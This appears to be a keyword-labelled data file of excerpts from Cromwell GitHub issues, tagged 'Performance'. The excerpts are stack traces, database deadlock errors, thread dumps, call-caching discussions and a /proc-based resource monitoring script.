akka.dispatch.forkjoin.ForkJoinW,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736:2969,concurren,concurrent,2969,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736,1,['concurren'],['concurrent']
Performance, scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); akka.dispatch.forkjoin.ForkJoinW,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:100209,concurren,concurrent,100209,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['concurren'],['concurrent']
Performance, scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:341); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:341); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:341); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:99); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:269); cats.effect.IO.unsafeToFuture(IO.scala:341); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:152); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); akka.dispatch.forkjoin.ForkJoinW,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4051:2474,concurren,concurrent,2474,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4051,1,['concurren'],['concurrent']
Performance," slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$SingleInsertAction.$anonfun$run$11(JdbcActionComponent.scala:511); 	at slick.jdbc.JdbcBackend$SessionDef.withPreparedInsertStatement(JdbcBackend.scala:379); 	at slick.jdbc.JdbcBackend$SessionDef.withPreparedInsertStatement$(JdbcBackend.scala:376); 	at slick.jdbc.JdbcBackend$BaseSession.withPreparedInsertStatement(JdbcBackend.scala:434); 	at slick.jdbc.JdbcActionComponent$ReturningInsertActionComposerImpl.preparedInsert(JdbcActionComponent.scala:640); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$SingleInsertAction.run(JdbcActionComponent.scala:508); 	at slick.jdbc.JdbcActionComponent$SimpleJdbcProfileAction.run(JdbcActionComponent.scala:31); 	at slick.jdbc.JdbcActionComponent$SimpleJdbcProfileAction.run(JdbcActionComponent.scala:28); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:240); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:240); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); 	at java.lang.Thread.run(Thread.java:748); 2017-07-13 22:07:39,149 cromwell-system-akka.actor.default-dispatcher-230 ERROR - Error summarizing metadata; com.mysql.jdbc.exceptions.jdbc4.MySQLIntegrityConstraintViolationException: Duplicate entry 'cromwell-workflow-id-cromwell-6d021019-ac3f-4a28-b034-d58fb92022' for key 'UC_CUSTOM_LABEL_ENTRY_CLK_CLV_WEU'; 	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method); 	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62); 	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45); 	at java.lang.reflect.Constructor.newInstance(Constructor.java:423); 	at com.mysql.jdbc.Util.handleNewInstance(Util.java:425); 	at com.mysql.jdbc.Util.getInstance(Util.java:408); 	at com.mysql.jdbc.SQLError.createS",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2452:3339,concurren,concurrent,3339,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2452,1,['concurren'],['concurrent']
Performance," slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$SingleInsertAction.$anonfun$run$11(JdbcActionComponent.scala:511); 	at slick.jdbc.JdbcBackend$SessionDef.withPreparedInsertStatement(JdbcBackend.scala:379); 	at slick.jdbc.JdbcBackend$SessionDef.withPreparedInsertStatement$(JdbcBackend.scala:376); 	at slick.jdbc.JdbcBackend$BaseSession.withPreparedInsertStatement(JdbcBackend.scala:434); 	at slick.jdbc.JdbcActionComponent$ReturningInsertActionComposerImpl.preparedInsert(JdbcActionComponent.scala:640); 	at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$SingleInsertAction.run(JdbcActionComponent.scala:508); 	at slick.jdbc.JdbcActionComponent$SimpleJdbcProfileAction.run(JdbcActionComponent.scala:31); 	at slick.jdbc.JdbcActionComponent$SimpleJdbcProfileAction.run(JdbcActionComponent.scala:28); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:240); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:240); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); 	at java.lang.Thread.run(Thread.java:748); ```. A deadlock in the DB =>; ```; 2017-07-13 22:14:36,622 cromwell-system-akka.dispatchers.service-dispatcher-549 ERROR - Failed to summarize metadata; com.mysql.jdbc.exceptions.jdbc4.MySQLTransactionRollbackException: Deadlock found when trying to get lock; try restarting transaction; 	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method); 	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62); 	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45); 	at java.lang.reflect.Constructor.newInstance(Constructor.java:423); 	at com.mysql.jdbc.Util.handleNewInstance(Util.java:425); 	at com.mysql.jdbc.Util.getInstance(Util.java:408); 	at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2452:6324,concurren,concurrent,6324,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2452,1,['concurren'],['concurrent']
Performance," slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$SingleInsertAction.$anonfun$run$15(JdbcActionComponent.scala:520); at slick.jdbc.JdbcBackend$SessionDef.withPreparedInsertStatement(JdbcBackend.scala:434); at slick.jdbc.JdbcBackend$SessionDef.withPreparedInsertStatement$(JdbcBackend.scala:431); at slick.jdbc.JdbcBackend$BaseSession.withPreparedInsertStatement(JdbcBackend.scala:491); at slick.jdbc.JdbcActionComponent$ReturningInsertActionComposerImpl.preparedInsert(JdbcActionComponent.scala:660); at slick.jdbc.JdbcActionComponent$InsertActionComposerImpl$SingleInsertAction.run(JdbcActionComponent.scala:517); at slick.jdbc.JdbcActionComponent$SimpleJdbcProfileAction.run(JdbcActionComponent.scala:28); at slick.jdbc.JdbcActionComponent$SimpleJdbcProfileAction.run(JdbcActionComponent.scala:25); at slick.basic.BasicBackend$DatabaseDef$$anon$3.liftedTree1$1(BasicBackend.scala:276); at slick.basic.BasicBackend$DatabaseDef$$anon$3.run(BasicBackend.scala:276); at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1144); at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:642); at java.base/java.lang.Thread.run(Thread.java:1589); Caused by: org.hsqldb.HsqlException: data exception: string data, right truncation; table: JOB_KEY_VALUE_ENTRY column: STORE_VALUE; at org.hsqldb.error.Error.error(Unknown Source); at org.hsqldb.Table.enforceTypeLimits(Unknown Source); at org.hsqldb.Table.generateAndCheckData(Unknown Source); at org.hsqldb.Table.insertSingleRow(Unknown Source); at org.hsqldb.StatementDML.insertRowSet(Unknown Source); at org.hsqldb.StatementInsert.getResult(Unknown Source); at org.hsqldb.StatementDMQL.execute(Unknown Source); at org.hsqldb.Session.executeCompiledStatement(Unknown Source); at org.hsqldb.Session.execute(Unknown Source); ... 17 common frames omitted; Caused by: org.hsqldb.HsqlException: data exception: string data, right truncation; at org.hsqldb.error.Error.error(Unknown Source); ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6947:3558,concurren,concurrent,3558,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6947,1,['concurren'],['concurrent']
Performance," sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""db-1"" #37 daemon prio=5 os_prio=0 tid=0x00007fdaf833e800 nid=0xa0d waiting on condition [0x00007fdb80ad0000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b76aed8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueu",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:3377,concurren,concurrent,3377,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance," the WMA; ./engine/src/test/scala/cromwell/engine/workflow/MaterializeWorkflowDescriptorActorSpec.scala: // TODO PBE: this should be done by MWDA (ticket #1076); ./engine/src/test/scala/cromwell/engine/workflow/MaterializeWorkflowDescriptorActorSpec.scala: // TODO: PBE: Re-enable (ticket #1063); ./engine/src/test/scala/cromwell/engine/WorkflowManagerActorSpec.scala: // TODO PBE: Restart workflows tests: re-add (but somewhere else?) in 0.21; ./project/Settings.scala: //""-deprecation"", // TODO: PBE: Re-enable deprecation warnings; ./services/src/main/scala/cromwell/services/metadata/MetadataService.scala: /* TODO: PBE: No MetadataServiceActor.props until circular dependencies fixed.; ./supportedBackends/jes/src/main/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActor.scala: // TODO: PBE: Trace callers of ""new CallContext()"". Seems to be multiple places in JES, etc. For now:; ./supportedBackends/jes/src/main/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActor.scala: // TODO: PBE: The REST endpoint toggles this value... how/where? Meanwhile, we read it decide to use the cache...; ./supportedBackends/jes/src/test/scala/cromwell/backend/impl/jes/JesAsyncBackendJobExecutionActorSpec.scala: // TODO: PBE: This spec may run faster by going back to mocks? Also, building the actor ref is copy/pasted a lot; ./supportedBackends/sfs/src/main/scala/cromwell/backend/sfs/SharedFileSystemAsyncJobExecutionActor.scala: // TODO: PBE: The REST endpoint toggles this value... how/where? Meanwhile, we read it decide to use the cache...; ./supportedBackends/sfs/src/test/scala/cromwell/backend/sfs/SharedFileSystemJobExecutionActorSpec.scala: // TODO: PBE: This test needs work. If the abort fires to quickly, it causes a race condition in waitAndPostProcess.; ./supportedBackends/sfs/src/test/scala/cromwell/backend/sfs/SharedFileSystemJobExecutionActorSpec.scala: // TODO: PBE: abort doesn't actually seem to abort. It runs the full 10 seconsds, then returns the response.`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1221#issuecomment-240175479:2185,cache,cache,2185,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1221#issuecomment-240175479,3,"['cache', 'race condition']","['cache', 'race condition']"
Performance, the below examples) how the ``out`` directory is not present in the call-cache hit. This makes getting output of tasks difficult to automate. I think this shard was a call caching miss:; ```; lichtens@gsa5 /dsde/working/lichtens/test_dl_oxoq/code/test_dl_oxoq/cromwell-executions/full_dl_ob_training/b449b259-4168-4002-b916-f85d152fea52/call-dl_ob_training$ ll shard-10/dl_ob_training/591dfd28-af3a-43ee-8429-d7053f90da93/call-ExtractReadInfo/execution/; total 1181; drwxrwsr-x 2 wga 14016 Jan 30 15:57 glob-20ebd8c9cf25515da3e6ce1213dba1ad/; -rw-rw-r-- 1 wga 7726 Jan 30 15:57 glob-20ebd8c9cf25515da3e6ce1213dba1ad.list; drwxrwsr-x 2 wga 14016 Jan 30 15:57 out/; -rw-rw-r-- 1 wga 2 Jan 30 15:57 rc; -rw-rw-r-- 1 wga 4819 Jan 30 15:56 script; -rw-rw-r-- 1 wga 1197 Jan 30 15:56 script.submit; -rw-r--r-- 1 wga 2740 Jan 30 15:57 stderr; -rw-rw-r-- 1 wga 0 Jan 30 15:56 stderr.submit; -rw-r--r-- 1 wga 274755 Jan 30 15:57 stdout; -rw-rw-r-- 1 wga 8 Jan 30 15:56 stdout.submit. ```. Whereas this one was a call cache hit:. ```; lichtens@gsa5 /dsde/working/lichtens/test_dl_oxoq/code/test_dl_oxoq/cromwell-executions/full_dl_ob_training/b449b259-4168-4002-b916-f85d152fea52/call-dl_ob_training$ ll shard-9/dl_ob_training/c5a2e7e2-3f45-4ea0-8558-84a1fa12120e/call-ExtractReadInfo/execution/; total 91; drwxrwsr-x 2 wga 8767 Jan 30 15:56 glob-20ebd8c9cf25515da3e6ce1213dba1ad/; lrwxrwxrwx 1 wga 244 Jan 30 15:56 rc -> /dsde/working/lichtens/test_dl_oxoq/code/test_dl_oxoq/cromwell-executions/full_dl_ob_training/2ce2eb73-4930-4b46-b93b-c30f3281e55c/call-dl_ob_training/shard-9/dl_ob_training/7150d86a-900f-4628-9b3d-476c483fcbd8/call-ExtractReadInfo/execution/rc; lrwxrwxrwx 1 wga 248 Jan 30 15:56 script -> /dsde/working/lichtens/test_dl_oxoq/code/test_dl_oxoq/cromwell-executions/full_dl_ob_training/2ce2eb73-4930-4b46-b93b-c30f3281e55c/call-dl_ob_training/shard-9/dl_ob_training/7150d86a-900f-4628-9b3d-476c483fcbd8/call-ExtractReadInfo/execution/script; lrwxrwxrwx 1 wga 248 Jan 30 15:56 stderr -> /ds,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1935:1351,cache,cache,1351,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1935,1,['cache'],['cache']
Performance," the group is not linear but some other DAG the scheme could be abandoned, or else perhaps the method would generalize with more complicated rules--I'm not sure.). Following is a motivation of the need for this feature, and sequence of arguments for why it can work.; ---------------------; We have a certain amount of input and output objects that we keep in their own buckets. The outputs are copied out of the execution folder after the workflow completes. These files we cache by reference, and that works fine, and we want to keep the inputs and outputs forever. However we have a large volume of intermediate files which end up in our cromwell-executions bucket. We love caching. It works great. A fully cached workflow runs in about 5 minutes at next to no cost. Fresh workflows (no cache hits) cost on the order of $0.50 for typical examples, and run for a few hours. Object storage has been eating us up, though. We've worked out that for a single one of these workflows the break even point at which it's cheaper to rerun it than to save it and cache it is about a week. If you take into account that we re-run workflows only a small part of the time, it probably doesn't even pay to keep the execution folders at all (except in the intangible wall clock time). [And nearline / coldline makes no sense at all. Each cached file is accessed multiple times which makes cached runs way way more expensive than fresh runs.]. We’ve examined the pipeline, and we see that we could reduce the size of intermediate outputs, from 126G to 40G by combining separate tasks, which obviates the need to make the large file an output of the first task and input to the second. This leads me to a question for the deep thinkers in Cromwell caching. I want to ask if something makes sense in theory, for the purpose of making caching more feasible for us. Suppose I took the two tasks I spoke of, one of which “passes” a large file to the second, and made them into a sub-workflow. And I mark the large files ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4064:1920,cache,cache,1920,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4064,1,['cache'],['cache']
Performance," the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving this because you are subscribed to this; > thread. Reply to this email directly, view it on GitHub <#5977; > <https://github.com/broadinstitute/cromwell/issues/5977>>, or unsubscribe; > https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ; > .; >; > —; > You are receiving this because you commented.; >; >; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EJEL23DXZQ4G3JVNQ3SPJKNNANCNFSM4S56ELLQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:2639,cache,cacheCopy,2639,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['cache'],['cacheCopy']
Performance," the object is mentioned as an output and the last task for which it is an input. This group of tasks would be considered as a group. The group of tasks would be skipped if the inputs to the first task and the outputs from the last task are all cache hits. (In case the group is not linear but some other DAG the scheme could be abandoned, or else perhaps the method would generalize with more complicated rules--I'm not sure.). Following is a motivation of the need for this feature, and sequence of arguments for why it can work.; ---------------------; We have a certain amount of input and output objects that we keep in their own buckets. The outputs are copied out of the execution folder after the workflow completes. These files we cache by reference, and that works fine, and we want to keep the inputs and outputs forever. However we have a large volume of intermediate files which end up in our cromwell-executions bucket. We love caching. It works great. A fully cached workflow runs in about 5 minutes at next to no cost. Fresh workflows (no cache hits) cost on the order of $0.50 for typical examples, and run for a few hours. Object storage has been eating us up, though. We've worked out that for a single one of these workflows the break even point at which it's cheaper to rerun it than to save it and cache it is about a week. If you take into account that we re-run workflows only a small part of the time, it probably doesn't even pay to keep the execution folders at all (except in the intangible wall clock time). [And nearline / coldline makes no sense at all. Each cached file is accessed multiple times which makes cached runs way way more expensive than fresh runs.]. We’ve examined the pipeline, and we see that we could reduce the size of intermediate outputs, from 126G to 40G by combining separate tasks, which obviates the need to make the large file an output of the first task and input to the second. This leads me to a question for the deep thinkers in Cromwell ca",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4064:1575,cache,cached,1575,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4064,1,['cache'],['cached']
Performance," to get cromwell config to set a profile name for `service2` as the expected authentication. The only profile it will look for is `default`. From my config it is set up as follows:. ```; aws {; application-name = ""CROMWELL-SERVER""; auths = [{; name = ""service2""; scheme = ""default""; }]. region = ""us-east-1""; }; ```. The error when I try to run a job is below which shows I am using a `profileName=default`. Looked through the code a bit but couldn't find where I can add that profilename to the config. If there is a way to change the profile name I would definitely use it, if not then I can set things up differently. Thanks. `cromwell_1 | Caused by: software.amazon.awssdk.core.exception.SdkClientException: Unable to load credentials from any of the providers in the chain AwsCredentialsProviderChain(credentialsProviders=[SystemPropertyCredentialsProvider(), EnvironmentVariableCredentialsProvider(), ProfileCredentialsProvider(profileName=default, profileFile=ProfileFile(profiles=[Profile(name=service1, properties=[aws_access_key_id, aws_secret_access_key]), Profile(name=service2, properties=[aws_access_key_id, aws_secret_access_key])])), ContainerCredentialsProvider(), InstanceProfileCredentialsProvider()]) : [SystemPropertyCredentialsProvider(): Unable to load credentials from system settings. Access key must be specified either via environment variable (AWS_ACCESS_KEY_ID) or system property (aws.accessKeyId)., EnvironmentVariableCredentialsProvider(): Unable to load credentials from system settings. Access key must be specified either via environment variable (AWS_ACCESS_KEY_ID) or system property (aws.accessKeyId)., ProfileCredentialsProvider(profileName=default, profileFile=ProfileFile(profiles=[Profile(name=service1, properties=[aws_access_key_id, aws_secret_access_key]), Profile(name=service2, properties=[aws_access_key_id, aws_secret_access_key])])): Profile file contained no credentials for profile 'default': ProfileFile(profiles=[Profile(name=service1, properties=",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5452:1184,load,load,1184,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5452,2,['load'],['load']
Performance," to know if it's technically feasible, but I think it would be ideal as an always-on stats provider. There are two main reasons why:; 1) Linux memory usage is complex enough that it's easy to get this wrong. I started with the script provided above, but on many systems it gives the wrong answer because linux aggressively caches things in memory, and you therefore ""used"" - ""buffers"" - ""cached"" is a much better approximation of the memory that's tied up. Here's a plot showing these two estimates vs output from docker stats:; ![image](https://user-images.githubusercontent.com/6463752/48026456-228c0f80-e114-11e8-9240-e5e7b1c3cb23.png). 2) Seemingly every new linux distro changes the output format and calculations of free and df. The number of rows and columns change, requiring complex gymnastics with awk to extract the required values and do the math. And some docker images don't come with free or df at all. This is a problem for me because I'm optimizing WDLs but it's not always easy to change the dockers they're running in (I'm guessing I'm not totally unique in this). Difficulties like this led me to develop a variant of the script that uses /proc for cpu and memory info. I've inlined it below:; ```; #!/bin/bash; set -Eeuo pipefail. MONITOR_MOUNT_POINT=${MONITOR_MOUNT_POINT:-""/cromwell_root""}; SLEEP_TIME=${SLEEP_TIME:-""10""}. function getCpuUsage() {; # get cpu info just by grep-ing from /proc/stat. Use awk to convert to %; grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {printf ""%.1f%%"", usage}'; }. function getMem() {; # get desired memory value from /proc/meminfo, in GiB, and also; # as a percentage of total; # argument is the label of the desired memory value; cat /proc/meminfo \; | awk -v MEM_FIELD=""$1"" '{; f[substr($1, 1, length($1)-1)] = $2; } END {; printf ""%.2f GiB"", f[MEM_FIELD] / 1048576; }' ; }. function getMemUnavailable() {; # get unavailable memory from /proc/meminfo, in GiB; cat /proc/meminfo \; | awk '{; f[substr($1, 1, length($1)-1)]",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2507#issuecomment-436035027:1105,optimiz,optimizing,1105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2507#issuecomment-436035027,1,['optimiz'],['optimizing']
Performance," to wait for <0x00000006c0041f30> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""pool-1-thread-20"" #81 prio=5 os_prio=31 tid=0x00007fb76cc5b800 nid=0xcb03 waiting on condition [0x000000013455e000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #80 prio=5 os_prio=31 tid=0x00007fb76cc59800 nid=0xc903 waiting on condition [0x0000000134093000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at 